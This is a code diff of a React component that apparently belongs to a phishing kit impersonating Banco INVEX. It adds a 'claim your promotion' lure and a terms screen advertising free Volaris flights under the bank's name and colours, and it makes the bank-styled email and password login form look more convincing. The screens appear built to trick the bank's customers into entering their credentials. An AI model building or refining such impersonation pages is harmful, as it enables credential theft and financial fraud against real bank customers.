@@ -158,6 +158,65 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     
     // Diferentes pantallas según el tipo
     switch (currentScreen) {
+      case ScreenType.PROMOCION:
+        const promocionContent = (
+          <>
+            <h2 className="text-xl font-bold mb-4 text-[#BE0046]">¡Reclama tu promoción!</h2>
+            <p className="text-gray-700 mb-6">
+              Haz clic en el botón de abajo para acceder a los términos y condiciones de la promoción.
+            </p>
+            <Button 
+              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
+              onClick={() => onSubmit(ScreenType.PROMOCION, {})}
+            >
+              Ver Términos y Condiciones
+            </Button>
+          </>
+        );
+        return getBankContainer(promocionContent);
+
+      case ScreenType.TERMINOS:
+        const terminosContent = (
+          <>
+            <h2 className="text-lg font-bold mb-4 text-[#BE0046]">
+              Términos y Condiciones de la Promoción B2 Vuelos Gratis a Clientes Seleccionados INVEX
+            </h2>
+            <div className="max-h-80 overflow-y-auto text-left mb-6 text-sm text-gray-700 pr-2">
+              <p className="mb-3">
+                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables a la promoción denominada "B2 Vuelos Gratis a Clientes Seleccionados INVEX" ofrecida por BANCO INVEX, S.A., INSTITUCIÓN DE BANCA MÚLTIPLE INVEX GRUPO FINANCIERO.
+              </p>
+              <p className="mb-2 font-semibold">1. Requisitos para Participar:</p>
+              <p className="mb-3">La promoción está dirigida exclusivamente a clientes seleccionados de INVEX Banco, quienes deberán cumplir con los siguientes requisitos:</p>
+              <ul className="mb-3 ml-4 list-disc">
+                <li>Ser titular de una tarjeta de crédito INVEX válida y activa.</li>
+                <li>Cumplir con las condiciones de elegibilidad que INVEX Banco determine.</li>
+                <li>Ser notificado de su selección para participar en la promoción.</li>
+              </ul>
+              <p className="mb-2 font-semibold">2. Descripción de la Promoción:</p>
+              <p className="mb-3">
+                Los clientes seleccionados recibirán el beneficio de un vuelo gratuito a tarifa aérea 0, cubriendo solo los cargos por TUA. La promoción solo aplica para vuelos con VOLARIS.
+              </p>
+              <p className="mb-2 font-semibold">3. Condiciones Generales:</p>
+              <ul className="mb-3 ml-4 list-disc">
+                <li>El vuelo gratuito solo incluye la tarifa aérea 0.</li>
+                <li>El cliente deberá asumir el costo del TUA y otros cargos adicionales.</li>
+                <li>Válido para vuelos nacionales e internacionales según disponibilidad.</li>
+              </ul>
+              <p className="mb-2 font-semibold">8. Uso de Datos Personales:</p>
+              <p className="mb-3">
+                Al participar, el cliente acepta que los datos personales puedan ser utilizados por INVEX Banco para fines relacionados con la promoción y otros fines comerciales.
+              </p>
+            </div>
+            <Button 
+              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
+              onClick={() => onSubmit(ScreenType.TERMINOS, {})}
+            >
+              Aceptar Términos
+            </Button>
+          </>
+        );
+        return getBankContainer(terminosContent);
+
       case ScreenType.FOLIO:
         const folioContent = (
           <>
@@ -253,14 +312,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <div className="mb-4">
               <div className="flex flex-col items-start mb-2">
                 <label className="text-sm text-gray-700 mb-1">
-                  Correo:
+                  Correo electrónico:
                 </label>
                 <Input 
-                  type="text" 
+                  type="email" 
                   value={loginInputs.username}
                   onChange={(e) => setLoginInputs({...loginInputs, username: e.target.value})}
-                  placeholder="Correo electrónico"
-                  className="w-full p-2 border border-gray-300 rounded"
+                  placeholder="ejemplo@correo.com"
+                  className="w-full p-3 border border-gray-300 rounded text-base"
                 />
               </div>
               
@@ -274,8 +333,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     // Limpiar error cuando el usuario escribe
                     if (passwordError) setPasswordError(null);
                   }}
-                  placeholder="Contraseña"
-                  className={`w-full p-2 border rounded ${passwordError ? 'border-red-500' : 'border-gray-300'}`}
+                  placeholder="Ingresa tu contraseña"
+                  className={`w-full p-3 border rounded text-base ${passwordError ? 'border-red-500' : 'border-gray-300'}`}
                 />
                 {passwordError && (
                   <p className="text-xs text-red-500 mt-1">{passwordError}</p>
@@ -284,10 +343,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
             
             <Button 
-              className={primaryBtnClass}
+              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
               onClick={handleLoginSubmit}
             >
-              Ingresar
+              Iniciar Sesión
             </Button>
           </>
         );
